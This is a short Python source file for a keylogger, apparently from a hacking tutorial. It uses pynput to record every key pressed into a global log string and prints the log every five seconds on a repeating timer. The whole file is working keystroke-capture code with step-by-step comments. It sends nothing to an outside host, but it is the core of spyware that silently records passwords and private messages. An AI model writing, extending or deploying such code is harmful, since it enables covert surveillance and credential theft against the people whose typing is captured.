#!/usr/bin/env python
import pynput.keyboard
import threading

log = "" #Creating an empty variable

class KeyLog():

    def process_key_press(self, key):
        global log
        try:
            log = log + str(key.char) #need to treat this object as a string.
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "
         #All information typed will be stored in this variable.

    def report(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(5, self.report) #Setting a timer. #Allows you to continue a running a fucntion.
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press =self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
